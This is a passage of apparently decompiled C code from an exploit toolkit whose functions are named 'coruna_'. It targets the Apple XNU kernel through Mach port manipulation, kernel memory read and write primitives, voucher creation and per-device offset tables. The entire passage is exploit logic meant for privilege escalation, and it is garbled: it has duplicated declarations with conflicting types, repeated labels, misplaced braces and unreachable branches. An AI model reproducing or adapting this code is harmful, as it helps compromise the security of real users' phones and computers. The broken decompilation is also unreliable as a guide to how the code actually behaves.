            str = (uint8_t *)coruna_proc_pidinfo_2b364(0,8);
            if ((int)str != 0) {
              return str;
            }
            handle = coruna_call_return_zero_2c0bc(handle,thread_attr);
            if (handle == 0) {
              return (uint8_t *)0x2800e;
            }
            err = coruna_kernel6544_via_fcntl_1bf84(handle,handle + 8,&thread_attr);
            if (err == 0) {
              return (uint8_t *)0x2800f;
            }
            if (((uint)thread_attr & 0x1f0000) != 0x40000) {
              return (uint8_t *)0x28011;
            }
            thread_attr = thread_attr & 0xffffffffffe0ffff | 0x10000;
            err = coruna_mach_vm_machine_attribute(handle,handle + 8);
            if (err == 0) {
              return (uint8_t *)0x28010;
            }
            version = _mach_port_mod_refs(*(ipc_space_t *)ptr,(mach_port_name_t)serial_buf,1,-1);
            if (version == 0) {
              size = 0;
              task = *(ipc_space_t *)ptr;
              poly = thread_attr;
              do {
                action = action & 0xffffffff00000000;
                version = _mach_port_allocate(task,1,(mach_port_name_t *)&action);
                if (version != 0) break;
                version = _mach_port_mod_refs(task,(uint)action,1,-1);
                if (version != 0) break;
                version = _mach_port_insert_right(task,(uint)action,poly,0x13);
                if (version == 0) {
                  lm12 = (uint)action;
                  if ((scratch >> 10 & 1) != 0) {
                    coruna_mach_vm_machine_attribute(handle,addr_2);
                  }
                  handle = coruna_call_return_zero_2c0bc(handle,thread_attr);
                  if (handle == 0) {
                    return (uint8_t *)0x2800e;
                  }
                  err = coruna_kernel6544_via_fcntl_1bf84(handle,handle + 8,&thread_attr);
                  if (err == 0) {
                    return (uint8_t *)0x2800f;
                  }
                  if (((uint)thread_attr & 0x1f0000) != 0x10000) {
                    return (uint8_t *)0x28011;
                  }
                  thread_attr = thread_attr & 0xffffffffffe0ffff | 0x100000;
                  err = coruna_mach_vm_machine_attribute(handle,handle + 8);
                  if (err == 0) {
                    return (uint8_t *)0x28010;
                  }
                  version = _mach_port_mod_refs(*(ipc_space_t *)ptr,thread_attr,4,-1);
                  if (version == 0) {
                    *arg = lm12;
                    return (uint8_t *)0x0;
                  }
                  break;
                }
                err = size < 8;
                size = size + 1;
              } while ((version & 0xfffffff7) == 5 && err);
            }
          }
        }
      }
      else {
        version = _mach_port_mod_refs(*(ipc_space_t *)ptr,lm12,0,1);
        if (version == 0) {
          *arg = lm12;
          return (uint8_t *)0x0;
        }
      }
      return (uint8_t *)(unsigned long)(version | 0x80000000);
    }
  }
  serial_buf = 0;
  err = *(int *)(handle + 0x140);
  handle = 0x38;
  if (err < 0x1f53) {
    if ((err != 0x1809) && (err != 0x1c1b)) {
      return (uint8_t *)0x2802c;
    }
  }
  else if (1 < err - 0x1f53U) {
    if (err != 0x2258) {
      return (uint8_t *)0x2802c;
    }
    handle = 0x30;
  }
  _arc4random_buf(&host_info,8);
  bootargs = 0;
  thread_attr = 0;
  thread_attr = 0;
  err = coruna_voucher_create();
  if (err == 0) {
done:
    err = false;
    str = &k_kernel_slot_1001;
    if (1 < serial_buf + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,serial_buf);
    }
    if (err) {
    *arg = (mach_port_name_t)serial_buf;
    }
    else if (1 < (mach_port_name_t)serial_buf + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)serial_buf);
    }
    return str;
  }
  addr = coruna_kernel6544_via_return_zero_2b000(handle,serial_buf);
  if (addr == 0) {
    err = false;
    str = (uint8_t *)0x28025;
    if (1 < serial_buf + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,serial_buf);
    }
    if (err) {
    *arg = (mach_port_name_t)serial_buf;
    }
    else if (1 < (mach_port_name_t)serial_buf + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)serial_buf);
    }
    return str;
  }
  addr = addr + handle;
  err = coruna_kernel6544_residual_256(handle,addr,&action);
  err = false;
  if (1 < serial_buf + 1) {
  _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,serial_buf);
  }
  if (err) {
  *arg = (mach_port_name_t)serial_buf;
  }
  else if (1 < (mach_port_name_t)serial_buf + 1) {
  _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)serial_buf);
  }
  return str;
}





long coruna_mach_port_destroy(long handle,uint size)
{
  uint u;
  int err;
  void *ptr;
  uint64_t size;
  long scratch;
  long bootargs;
  uint64_t thread_attr;
  void *host_info;
  long serial_buf;
  
  thread_attr = 0;
  host_info = (void *)0x0;
  scratch = 0;
  bootargs = 0;
  if (*(int *)(handle + 0x140) == 0x1c1b || *(int *)(handle + 0x140) == 0x1809) {
    u = *(uint *)(handle + 0x180);
    if (*(uint *)(handle + 0x180) <= size) {
      u = size;
    }
    serial_buf = 0;
    ptr = _calloc((unsigned long)u,1);
    if (ptr == (void *)0x0) {
      return 0;
    }
    err = coruna_iomfb_slot_read(u << 1,&serial_buf);
    if ((((err == 0) && (err = coruna_return_zero_15824(serial_buf,0x1000000,4,0), err == 0)) &&
        (err = coruna_return_zero_15824(serial_buf,0x8000000,4,"key"), err == 0)) &&
       (err = coruna_return_zero_15824(serial_buf,0x8a000000,(unsigned long)u,ptr), err == 0)) {
      err = coruna_memcpy_15934(serial_buf,&host_info,(long)&thread_attr + 4);
    }
    if (serial_buf != 0) {
      coruna_free_15ed4();
    }
    _free(ptr);
    if (err == 0) {
      size = coruna_ioservice_publish_1c3c4(host_info,thread_attr,&thread_attr);
      u = (mach_port_name_t)size + 1;
      if (((((1 < u) && (bootargs = coruna_kernel6544_via_return_zero_2b000(handle,size), bootargs != 0)) &&
           ((err = coruna_kernel6544_residual_256(handle,bootargs + 0x10,&bootargs), err != 0 &&
            ((err = coruna_kernel6544_residual_256(handle,bootargs + 0x18,&bootargs), err != 0 &&
             (err = coruna_kernel6544_residual_256(handle,bootargs + 0x20,&bootargs), err != 0)))))) &&
          (err = coruna_kernel6544_residual_256(handle,bootargs + *(int *)(handle + 0x168),&bootargs), err != 0)
          ) && (((err = coruna_kernel6544_residual_256(handle,bootargs + 0x18,&scratch), err != 0 &&
                 (scratch = coruna_ptr_canonicalize(handle,scratch), scratch != 0)) &&
                (err = coruna_call_mach_vm_machine_attribute_29df8(handle,bootargs + 0x18,0), err == 0)))) {
        scratch = 0;
      }
      if (host_info != (void *)0x0) {
        _free(host_info);
      }
      if (1 < u) {
        _mach_port_destroy(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)size);
      }
      if ((mach_port_name_t)thread_attr + 1 < 2) {
        return scratch;
      }
      _mach_port_destroy(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)thread_attr);
      return scratch;
    }
  }
  return 0;
}





uint8_t * coruna_mach_port_allocate(long handle,long addr_2,unsigned long arg)
{
  pthread_mutex_t *ptr;
  mach_port_name_t lm2;
  uint64_t *ptr;
  uint u;
  uint8_t *buf;
  uint size;
  ipc_space_t task;
  int err;
  uint version;
  long handle;
  mach_port_name_t lm10;
  uint8_t *str;
  unsigned long port;
  uint64_t *copy;
  uint64_t *data;
  void *ptr;
  uint8_t *obj;
  uint64_t tag;
  uint64_t kind;
  mach_port_name_t scratch;
  vm_address_t bootargs [3];
  
  buf = k_kernel_mach_task_self_slot;
  version = (uint)arg;
  if (*(unsigned long *)(handle + 0x158) < 0x1f541e00000000) {
    scratch = 0;
    size = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,&scratch);
    lm10 = scratch;
    if (size != 0) {
      return (uint8_t *)(unsigned long)(size | 0x80000000);
    }
    str = (uint8_t *)coruna_buf_init(bootargs);
    if ((int)str == 0) {
      str = (uint8_t *)coruna_kernel6544_via_buf_grow(bootargs,0xffffffff);
      if ((int)str == 0) {
        str = (uint8_t *)coruna_mach_msg(bootargs,0,lm10,0);
        coruna_free_1bd0c(bootargs);
        if ((int)str == 0) {
          bootargs[0] = coruna_u64_pack71((bootargs[0]), (2));
          size = *(uint *)(handle + 0x168);
          u = 0;
          if (size != 0) {
            u = version / size;
          }
          if (((version == u * size) && (handle = coruna_kernel6544_via_kernel6544_via_kernel6544_via_return_zero_2db28(handle,scratch), handle != 0)) &&
             (ptr = _calloc(arg & 0xffffffff,1), ptr != (void *)0x0)) {
            err = coruna_nop_stub_7(handle,addr_2,ptr,arg);
            _free(ptr);
            if ((err != 0) && (err = coruna_kernel6544_residual_257(handle,handle + 0x24,addr_2), err != 0)) {
              size = 0;
              if (*(uint *)(handle + 0x168) != 0) {
                size = version / *(uint *)(handle + 0x168);
              }
              err = coruna_mach_vm_machine_attribute(handle,handle + 0x30,size);
              if (err != 0) {
                err = coruna_nop_stub_7(handle,handle + 0x2f,bootargs,1);
                version = 0x1001;
                if (err != 0) {
                  version = 0;
                }
                str = (uint8_t *)(unsigned long)version;
                task = *(ipc_space_t *)buf;
                lm10 = scratch;
                _mach_port_mod_refs(task,lm10,1,-1);
                return str;
              }
            }
          }
          str = &k_kernel_slot_1001;
        }
      }
      else {
        coruna_free_1bd0c(bootargs);
      }
    }
fail:
    task = *(ipc_space_t *)buf;
    lm10 = scratch;
    _mach_port_mod_refs(task,lm10,1,-1);
    return str;
  }
  bootargs[0] = 0;
  if ((arg & 0xf) != 0) {
    return (uint8_t *)0xad001;
  }
  size = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,bootargs,arg & 0xffffffff,1);
  if (size == 0) {
    ptr = (pthread_mutex_t *)(handle + 0x330);
    size = _pthread_mutex_lock(ptr);
    if (size == 0) {
      if (*(void **)(handle + 0x370) != (void *)0x0) {
        copy = (uint64_t *)0x0;
        data = *(void **)(handle + 0x370);
        do {
          if ((data[1] == addr_2) && (*(uint *)(data + 3) == version)) {
            ptr = (uint64_t *)(handle + 0x370);
            if (copy != (uint64_t *)0x0) {
              ptr = copy;
            }
            *ptr = *data;
            size = _pthread_mutex_unlock(ptr);
            version = -size;
            if (-1 < (int)size) {
            version = size;
            }
            str = (uint8_t *)(unsigned long)(version | 0x40000000);
            lm10 = 0;
            }
            else {
            str = (uint8_t *)(unsigned long)(size | 0x80000000);
            lm10 = 0;
            }
            check_ok:
            if (bootargs[0] != 0) {
            _vm_deallocate(*(vm_map_t *)buf,bootargs[0],arg & 0xffffffff);
            }
            if (lm10 + 1 < 2) {
            return str;
          }
          ptr = (void *)*data;
          copy = data;
          data = ptr;
        } while (ptr != (void *)0x0);
      }
      size = _pthread_mutex_unlock(ptr);
      if (size == 0) {
        str = (uint8_t *)0xad011;
        lm10 = 0;
        if (bootargs[0] != 0) {
        _vm_deallocate(*(vm_map_t *)buf,bootargs[0],arg & 0xffffffff);
        }
        if (lm10 + 1 < 2) {
        return str;
        }
        task = *(ipc_space_t *)buf;
        _mach_port_mod_refs(task,lm10,1,-1);
        return str;
      }
    }
cleanup:
    version = -size;
    if (-1 < (int)size) {
      version = size;
    }
    str = (uint8_t *)(unsigned long)(version | 0x40000000);
    lm10 = 0;
  }
  else {
    str = (uint8_t *)(unsigned long)(size | 0x80000000);
    lm10 = 0;
  }
check_ok:
  if (bootargs[0] != 0) {
    _vm_deallocate(*(vm_map_t *)buf,bootargs[0],arg & 0xffffffff);
  }
  if (lm10 + 1 < 2) {
    return str;
  }
  task = *(ipc_space_t *)buf;
done:
  _mach_port_mod_refs(task,lm10,1,-1);
  return str;
}





void coruna_mach_port_request_notification(long handle,long addr_2,mach_port_name_t *arg)
{
  ipc_space_t task;
  uint u;
  uint8_t *ptr;
  mach_port_t poly;
  bool err;
  int err;
  uint size;
  kern_return_t lk6;
  int status;
  uint version;
  uint64_t port;
  long handle;
  long addr;
  mach_port_name_t lm12;
  uint tag;
  uint scratch;
  long bootargs;
  uint64_t thread_attr;
  long host_info;
  uint64_t serial_buf;
  vm_address_t action;
  
  action = action & 0xffffffff00000000;
  err = coruna_kernel6544_via_mach_vm_read_overwrite(handle,addr_2,&action);
  tag = 0x2800f;
  if (err == 0) {
    return;
  }
  if (-1 < (int)(uint)action) {
    return;
  }
  if (0x1f52ffffffffff < *(unsigned long *)(handle + 0x158)) {
    version = 0x200000;
    if (*(unsigned long *)(handle + 0x158) < 0x1f541900000000) {
      version = 0x400000;
    }
    port = coruna_kernel6544_via_mach_vm_read_overwrite(handle,addr_2 + 8,&action);
    if ((int)port == 0) {
      return;
    }
    if ((((uint)action & version) != 0) &&
       (port = coruna_mach_vm_machine_attribute(handle,addr_2 + 8,(uint)action & (version ^ 0xffffffff)),
       (int)port == 0)) {
      return;
    }
    if (0x1f543c407fffff < *(unsigned long *)(handle + 0x158)) {
      serial_buf = 0;
      thread_attr = 0;
      scratch = 0;
      action = 0;
      err = coruna_proc_pidinfo_28ba4(port,8);
      ptr = k_kernel_mach_task_self_slot;
      if (err != 0) {
        return;
      }
      handle = coruna_mach_ports_register(handle,*(uint32_t *)k_kernel_mach_task_self_slot,&bootargs,
                            (long)&serial_buf + 4);
      if (handle == 0) {
        return;
      }
      version = serial_buf * (uint)bootargs;
      size = _vm_allocate(*(vm_map_t *)ptr,&action,(unsigned long)version,1);
      if (size == 0) {
        err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,handle,serial_buf * (uint)bootargs,action);
        if (err == 0) {
          lm12 = 0;
        }
        else {
          if ((uint)bootargs != 0) {
            size = 0;
            do {
              host_info = 0;
              handle = action + serial_buf * size;
              ___memcpy_chk(&host_info,handle,(long)*(int *)(handle + 0x168),8);
              if (((host_info != 0) && (host_info = coruna_kernel6544_via_fn_ptr_cast_10_10(handle), host_info == addr_2)) &&
                 (u = *(uint *)(handle + *(int *)(handle + 0x168)), (u >> 0x10 & 1) != 0))
              {
                tag = 0;
                lm12 = (mach_port_name_t)(coruna_u64_pack((size), (u)) >> 0x18);
                if ((action != 0) && (version != 0)) {
                _vm_deallocate(*(vm_map_t *)ptr,action,(unsigned long)version);
                }
                if (tag != 0) {
                return;
                }
                if (1 < lm12 + 1) {
                lk6 = _mach_port_mod_refs(*(ipc_space_t *)ptr,lm12,0,1);
                if (lk6 != 0) {
                return;
                }
                *arg = lm12;
                return;
                }
                lk6 = _mach_port_allocate(*(ipc_space_t *)ptr,1,(mach_port_name_t *)&serial_buf);
                if (lk6 != 0) {
                return;
                }
                handle = coruna_call_helper_25fa0(handle,(mach_port_name_t)serial_buf);
                if (handle == 0) {
                return;
                }
                addr = coruna_fn_ptr_cast_6(handle,handle);
                if (addr == 0) {
                return;
                }
                err = *(int *)(handle + 0x168);
                status = coruna_kernel6544_via_mach_vm_read_overwrite(handle,addr_2,&scratch);
                if (status == 0) {
                return;
                }
                if (((scratch >> 10 & 1) != 0) &&
                (status = coruna_mach_vm_machine_attribute(handle,addr_2,scratch & 0xfffffbff), status == 0)) {
                return;
                }
                err = coruna_kernel6544_residual_308(handle,handle + (unsigned long)(uint)(((int)addr - (int)handle) + err * 2),
                addr_2);
                if (err == 0) {
                return;
                }
                lk6 = _mach_port_request_notification
                (*(ipc_space_t *)ptr,(mach_port_name_t)serial_buf,0x46,1,0,0x15,
                (mach_port_t *)((long)&thread_attr + 4));
                if (lk6 != 0) {
                return;
                }
                if (thread_attr + 1 < 2) {
                return;
                }
                err = coruna_proc_pidinfo_28ba4(0,8);
                if (err != 0) {
                return;
                }
                handle = coruna_call_helper_25ed0(handle,thread_attr);
                if (handle == 0) {
                return;
                }
                err = coruna_kernel6544_via_mach_vm_read_overwrite(handle,handle + 8,&thread_attr);
                if (err == 0) {
                return;
                }
                if (((uint)thread_attr & 0x1f0000) != 0x40000) {
                return;
                }
                thread_attr = thread_attr & 0xffffffffffe0ffff | 0x10000;
                err = coruna_mach_vm_machine_attribute(handle,handle + 8);
                if (err == 0) {
                return;
                }
                lk6 = _mach_port_mod_refs(*(ipc_space_t *)ptr,(mach_port_name_t)serial_buf,1,-1);
                if (lk6 != 0) {
                return;
                }
                tag = 0;
                task = *(ipc_space_t *)ptr;
                poly = thread_attr;
                while( true ) {
                action = action & 0xffffffff00000000;
                lk6 = _mach_port_allocate(task,1,(mach_port_name_t *)&action);
                if (lk6 != 0) {
                return;
                }
                lk6 = _mach_port_mod_refs(task,(uint)action,1,-1);
                if (lk6 != 0) {
                return;
                }
                version = _mach_port_insert_right(task,(uint)action,poly,0x13);
                if (version == 0) break;
                err = 7 < tag;
                tag = tag + 1;
                if ((version & 0xfffffff7) != 5 || err) {
                return;
                }
                }
                lm12 = (uint)action;
                if ((scratch >> 10 & 1) != 0) {
                coruna_mach_vm_machine_attribute(handle,addr_2);
                }
                handle = coruna_call_helper_25ed0(handle,thread_attr);
                if (handle == 0) {
                return;
                }
                err = coruna_kernel6544_via_mach_vm_read_overwrite(handle,handle + 8,&thread_attr);
                if (err == 0) {
                return;
                }
                if (((uint)thread_attr & 0x1f0000) != 0x10000) {
                return;
                }
                thread_attr = thread_attr & 0xffffffffffe0ffff | 0x100000;
                err = coruna_mach_vm_machine_attribute(handle,handle + 8);
                if (err == 0) {
                return;
                }
                lk6 = _mach_port_mod_refs(*(ipc_space_t *)ptr,thread_attr,4,-1);
                if (lk6 != 0) {
                return;
                }
                *arg = lm12;
                return;
              }
              size = size + 1;
            } while (size < (uint)bootargs);
          }
          lm12 = 0;
          tag = 0;
        }
      }
      else {
        lm12 = 0;
        tag = size | 0x80000000;
      }
fail:
      if ((action != 0) && (version != 0)) {
        _vm_deallocate(*(vm_map_t *)ptr,action,(unsigned long)version);
      }
      if (tag != 0) {
        return;
      }
      if (1 < lm12 + 1) {
        lk6 = _mach_port_mod_refs(*(ipc_space_t *)ptr,lm12,0,1);
        if (lk6 != 0) {
          return;
        }
        *arg = lm12;
        return;
      }
      lk6 = _mach_port_allocate(*(ipc_space_t *)ptr,1,(mach_port_name_t *)&serial_buf);
      if (lk6 != 0) {
        return;
      }
      handle = coruna_call_helper_25fa0(handle,(mach_port_name_t)serial_buf);
      if (handle == 0) {
        return;
      }
      addr = coruna_fn_ptr_cast_6(handle,handle);
      if (addr == 0) {
        return;
      }
      err = *(int *)(handle + 0x168);
      status = coruna_kernel6544_via_mach_vm_read_overwrite(handle,addr_2,&scratch);
      if (status == 0) {
        return;
      }
      if (((scratch >> 10 & 1) != 0) &&
         (status = coruna_mach_vm_machine_attribute(handle,addr_2,scratch & 0xfffffbff), status == 0)) {
        return;
      }
      err = coruna_kernel6544_residual_308(handle,handle + (unsigned long)(uint)(((int)addr - (int)handle) + err * 2),
                           addr_2);
      if (err == 0) {
        return;
      }
      lk6 = _mach_port_request_notification
                        (*(ipc_space_t *)ptr,(mach_port_name_t)serial_buf,0x46,1,0,0x15,
                         (mach_port_t *)((long)&thread_attr + 4));
      if (lk6 != 0) {
        return;
      }
      if (thread_attr + 1 < 2) {
        return;
      }
      err = coruna_proc_pidinfo_28ba4(0,8);
      if (err != 0) {
        return;
      }
      handle = coruna_call_helper_25ed0(handle,thread_attr);
      if (handle == 0) {
        return;
      }
      err = coruna_kernel6544_via_mach_vm_read_overwrite(handle,handle + 8,&thread_attr);
      if (err == 0) {
        return;
      }
      if (((uint)thread_attr & 0x1f0000) != 0x40000) {
        return;
      }
      thread_attr = thread_attr & 0xffffffffffe0ffff | 0x10000;
      err = coruna_mach_vm_machine_attribute(handle,handle + 8);
      if (err == 0) {
        return;
      }
      lk6 = _mach_port_mod_refs(*(ipc_space_t *)ptr,(mach_port_name_t)serial_buf,1,-1);
      if (lk6 != 0) {
        return;
      }
      tag = 0;
      task = *(ipc_space_t *)ptr;
      poly = thread_attr;
      while( true ) {
        action = action & 0xffffffff00000000;
        lk6 = _mach_port_allocate(task,1,(mach_port_name_t *)&action);
        if (lk6 != 0) {
          return;
        }
        lk6 = _mach_port_mod_refs(task,(uint)action,1,-1);
        if (lk6 != 0) {
          return;
        }
        version = _mach_port_insert_right(task,(uint)action,poly,0x13);
        if (version == 0) break;
        err = 7 < tag;
        tag = tag + 1;
        if ((version & 0xfffffff7) != 5 || err) {
          return;
        }
      }
      lm12 = (uint)action;
      if ((scratch >> 10 & 1) != 0) {
        coruna_mach_vm_machine_attribute(handle,addr_2);
      }
      handle = coruna_call_helper_25ed0(handle,thread_attr);
      if (handle == 0) {
        return;
      }
      err = coruna_kernel6544_via_mach_vm_read_overwrite(handle,handle + 8,&thread_attr);
      if (err == 0) {
        return;
      }
      if (((uint)thread_attr & 0x1f0000) != 0x10000) {
        return;
      }
      thread_attr = thread_attr & 0xffffffffffe0ffff | 0x100000;
      err = coruna_mach_vm_machine_attribute(handle,handle + 8);
      if (err == 0) {
        return;
      }
      lk6 = _mach_port_mod_refs(*(ipc_space_t *)ptr,thread_attr,4,-1);
      if (lk6 != 0) {
        return;
      }
      *arg = lm12;
      return;
    }
  }
  serial_buf = 0;
  err = *(int *)(handle + 0x140);
  handle = 0x38;
  if (err < 0x1f53) {
    if ((err != 0x1809) && (err != 0x1c1b)) {
      return;
    }
  }
  else if (1 < err - 0x1f53U) {
    if (err != 0x2258) {
      return;
    }
    handle = 0x30;
  }
  _arc4random_buf(&host_info,8);
  bootargs = 0;
  thread_attr = 0;
  thread_attr = 0;
  err = coruna_host_create_mach_voucher();
  if (err == 0) {
done:
    err = false;
    if (1 < serial_buf + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,serial_buf);
    }
    if (err) {
    *arg = (mach_port_name_t)serial_buf;
    }
    else if (1 < (mach_port_name_t)serial_buf + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)serial_buf);
    }
    return;
  }
  addr = coruna_kernel6544_via_kernel6544_via_fn_ptr_cast_2_4(handle,serial_buf);
  if (addr == 0) {
    err = false;
    if (1 < serial_buf + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,serial_buf);
    }
    if (err) {
    *arg = (mach_port_name_t)serial_buf;
    }
    else if (1 < (mach_port_name_t)serial_buf + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)serial_buf);
    }
    return;
  }
  addr = addr + handle;
  err = coruna_kernel6544_residual_307(handle,addr,&action);
  err = false;
  if (1 < serial_buf + 1) {
  _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,serial_buf);
  }
  if (err) {
  *arg = (mach_port_name_t)serial_buf;
  }
  else if (1 < (mach_port_name_t)serial_buf + 1) {
  _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)serial_buf);
  }
  return;
}





long coruna_vm_deallocate_2c8ec(uint64_t val,uint *size)
{
  uint8_t *ptr;
  uint u;
  kern_return_t lk3;
  int err;
  long handle;
  unsigned long size;
  vm_address_t scratch;
  uint bootargs;
  
  bootargs = *size;
  handle = coruna_mach_port_request_notification(val,&bootargs);
  u = bootargs;
  ptr = k_kernel_mach_task_self_slot;
  if (handle != 0) {
    scratch = 0;
    size = (unsigned long)bootargs;
    lk3 = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,size,1);
    if (lk3 == 0) {
      err = coruna_nop_stub_7(val,handle,scratch,size);
      if (err != 0) {
        if (u != *size) {
          *size = u;
        }
        _vm_deallocate(*(vm_map_t *)ptr,scratch,size);
        return handle;
      }
      _vm_deallocate(*(vm_map_t *)ptr,scratch,size);
    }
    coruna_mach_port_allocate(val,handle,size);
  }
  return 0;
}





unsigned long coruna_kernel6544_via_kernel6544_via_fcntl_1bf84_4(uint *arg,uint64_t val,uint64_t n,int m,
                  uint16_t p)

{
  uint type_id_13;
  int flags;
  unsigned long u;
  long base;
  long serial_11;
  uint cache_45;
  uint cache_68;
  uint cache_21;
  uint cache_54;
  uint cache_53;
  uint cache_34;
  long scratch;
  uint64_t cache_41;
  uint16_t cache_91;
  
  scratch = 0;
  cache_41 = 0;
  if ((*arg & 0x5584201) == 0) {
    return 0xad008;
  }
  cache_91 = p;
  u = coruna_slab_table_walk(arg,&cache_34,&cache_53,&cache_54,&cache_21);
  if ((int)u != 0) {
    return u;
  }
  u = coruna_host_processor_count(arg,n,&cache_41);
  if ((int)u != 0) {
    return u;
  }
  base = coruna_kernel6544_via_return_zero_2b000(arg,val);
  if (base == 0) {
    return 0x2800e;
  }
  flags = coruna_kernel6544_residual_256(arg,base + (unsigned long)cache_34,&scratch);
  if (flags == 0) {
    return 0x2800f;
  }
  if ((scratch != 0) && (serial_11 = coruna_ptr_canonicalize(arg), serial_11 == 0)) {
    return 0x28026;
  }
  flags = coruna_call_mach_vm_machine_attribute_29df8(arg,base + (unsigned long)cache_34,cache_41);
  if (flags == 0) {
    return 0x28010;
  }
  if (m != 0) {
    flags = coruna_kernel6544_via_fcntl_1bf84(arg,base + (unsigned long)cache_53,&cache_68);
    if (flags == 0) {
      return 0x2800f;
    }
    if (3 < cache_68) {
      return 0x28011;
    }
    flags = coruna_kernel6544_via_fcntl_1bf84(arg,base + (unsigned long)cache_54,&cache_45);
    if (flags == 0) {
      return 0x2800f;
    }
    if (12000000 < cache_45) {
      return 0x28011;
    }
    flags = coruna_mach_vm_machine_attribute(arg,base + (unsigned long)cache_53,1);
    if (flags == 0) {
      return 0x28010;
    }
    flags = coruna_mach_vm_machine_attribute(arg,base + (unsigned long)cache_54,12000000);
    if (flags == 0) {
      return 0x28010;
    }
  }
  flags = coruna_nop_stub_6(arg,base + (unsigned long)cache_21,2,&cache_68);
  if (flags == 0) {
    return 0x2800f;
  }
  if (0x7f < (ushort)cache_68) {
    return 0x28011;
  }
  flags = coruna_nop_stub_7(arg,base + (unsigned long)cache_21,&cache_91,2);
  type_id_13 = 0;
  if (flags == 0) {
    type_id_13 = 0x28010;
  }
  return (unsigned long)type_id_13;
}





uint64_t coruna_slab_table_walk(uint *size,uint *flags_2,int *flags,int *count_2,int *fd_3)
{
  bool err;
  bool status;
  int err;
  int status;
  uint u;
  uint size;
  int flags;
  uint version;
  int count;
  unsigned long port;
  int idx;
  
  size = 0x5584001;
  port = *(unsigned long *)(size + 0x56);
  version = *size;
  if (0x44a < port >> 0x2b) {
    size = 0x5584201;
  }
  if ((version & size) == 0) {
    return 0xad008;
  }
  size = size[0x50];
  if ((int)size < 0x2258) {
    if (size - 0x1f53 < 2) {
      if ((version >> 0x14 & 1) == 0) {
        flags = 0x16c;
        if (port < 0x1f530f02800000) {
          flags = 0x170;
        }
        size = 0x210;
        if (port < 0x1f530f02800000) {
          size = 0x280;
        }
        count = 0x1b4;
        if (port < 0x1f530f02800000) {
          count = 0x224;
        }
        status = 0x174;
        if (port < 0x1f530f02800000) {
          status = 0x178;
        }
        u = 0x218;
        if (port < 0x1f530f02800000) {
          u = 0x288;
        }
        idx = 0x1bc;
        if (port < 0x1f530f02800000) {
          idx = 0x22c;
        }
        status = (version & 0x84000) != 0;
        if (status) {
          count = idx;
          flags = status;
          size = u;
        }
        status = 0x184;
        if (status) {
          status = 0x18c;
        }
        *flags_2 = size;
        *flags = flags;
        *count_2 = count;
        *fd_3 = status;
        return 0;
      }
      err = 0x1f530f027ffffe < port;
      status = port == 0x1f530f027fffff;
      flags = 0x17c;
      if (port < 0x1f530f02800000) {
        flags = 0x180;
      }
      size = 0x220;
      if (port < 0x1f530f02800000) {
        size = 0x290;
      }
      count = 0x1c4;
      if (port < 0x1f530f02800000) {
        count = 0x230;
      }
      idx = 400;
      status = 0x194;
    }
    else {
      if (size != 0x1809) {
        if (size != 0x1c1b) {
          return 0x2802c;
        }
        status = (version & 0x84000) != 0;
        version = 0x280;
        if (status) {
          version = 0x288;
        }
        status = 0x16c;
        if (status) {
          status = 0x174;
        }
        idx = 0x22c;
        if (status) {
          idx = 0x234;
        }
        err = 0x184;
        if (status) {
          err = 0x18c;
        }
        status = 0x1c1b19145fffff < port;
        size = 0x1c0;
        if (status) {
          size = version;
        }
        count = 0x16c;
        flags = 0xac;
        if (status) {
          count = idx;
          flags = status;
        }
        status = 0xc4;
        if (status) {
          status = err;
        }
        *flags_2 = size;
        *flags = flags;
        *count_2 = count;
        *fd_3 = status;
        return 0;
      }
      err = 0x18090a095ffffe < port;
      status = port == 0x18090a095fffff;
      size = 0x1a0;
      if (port < 0x18090a09600000) {
        size = 0x1a8;
      }
      flags = 0xa4;
      if (port < 0x18090a09600000) {
        flags = 0xac;
      }
      count = 0x14c;
      if (port < 0x18090a09600000) {
        count = 0x154;
      }
      idx = 0xc4;
      status = 0xbc;
    }
    if (!err || status) {
      status = idx;
    }
    *flags_2 = size;
    *flags = flags;
    *count_2 = count;
    *fd_3 = status;
    return 0;
  }
  if ((size != 0x2258) && (size != 0x225c)) {
    if (size != 0x2712) {
      return 0x2802c;
    }
    version = version & 0x518e241;
    if (version < 0x100000) {
      if (version == 1) {
        version = 0;
      }
      else {
        if ((version != 0x4000) && (version != 0x80000)) {
          return 0x2802c;
        }
        version = 0x10;
      }
    }
    else if ((version == 0x100000) || (version == 0x1000000)) {
      version = 0x18;
    }
    else {
      if (version != 0x4000000) {
        return 0x2802c;
      }
      version = 0x68;
    }
    size = version | 0x200;
    flags = version + 0x164;
    count = version + 0x1b4;
    status = version + 0x17c;
    *flags_2 = size;
    *flags = flags;
    *count_2 = count;
    *fd_3 = status;
    return 0;
  }
  version = version & 0x518e241;
  if (version < 0x80000) {
    if (version == 1) {
      status = 0x10;
    }
    else {
      if (version != 0x200) {
        if (version != 0x4000) {
          return 0x2802c;
        }
        goto done;
      }
      status = 0;
    }
  }
  else if (version == 0x80000) {
done:
    status = 0x20;
  }
  else {
    if ((version != 0x100000) && (version != 0x1000000)) {
      return 0x2802c;
    }
    status = 0x28;
  }
  size = status + 0x1e8;
  flags = status + 0x154;
  count = status + 0x19c;
  status = status + 0x16c;
fail:
  *flags_2 = size;
  *flags = flags;
  *count_2 = count;
  *fd_3 = status;
  return 0;
}





